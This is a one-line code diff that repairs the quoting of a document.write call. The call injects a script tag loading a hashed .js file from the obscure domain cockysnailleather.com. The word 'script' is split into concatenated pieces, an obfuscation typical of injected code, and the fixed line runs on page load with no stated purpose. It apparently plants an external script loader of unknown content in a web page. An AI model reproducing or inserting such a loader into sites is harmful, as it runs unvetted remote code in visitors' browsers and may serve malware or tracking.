@@ -1,1 +1,1 @@
-document.write('<scr' + 'ipt type='text/javascript' src='//cockysnailleather.com/6f/92/68/6f9268f6f898aabd127efb72bbaad9dc.js'></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="//cockysnailleather.com/6f/92/68/6f9268f6f898aabd127efb72bbaad9dc.js"></scr' + 'ipt>')
